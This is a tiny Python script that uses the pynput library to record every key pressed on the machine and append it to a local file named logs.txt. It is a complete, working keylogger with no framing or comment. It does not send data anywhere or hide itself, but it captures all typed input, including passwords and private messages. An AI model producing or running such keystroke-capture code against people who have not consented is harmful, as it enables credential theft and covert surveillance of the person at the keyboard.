
from pynput.keyboard import Listener


def write_to_txt_file(key):
    key_info = str(key)
    key_info = key_info.replace("'", "")
    with open("logs.txt", "a") as l:
        l.write(key_info)


with Listener(on_press=write_to_txt_file) as w:
    w.join()
